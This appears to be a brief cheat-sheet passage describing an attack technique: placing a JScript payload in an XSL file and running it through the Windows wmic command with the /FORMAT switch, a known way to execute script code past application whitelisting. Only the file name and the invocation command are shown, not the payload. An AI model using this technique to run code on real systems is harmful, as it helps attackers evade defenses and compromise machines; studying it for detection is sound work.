Define the XSL file containing the jscript payload:
```
file.xsl
```
Invoke any wmic command now and specify /format pointing to the file.xsl:
```
wmic os get /FORMAT:"file.xsl"
```
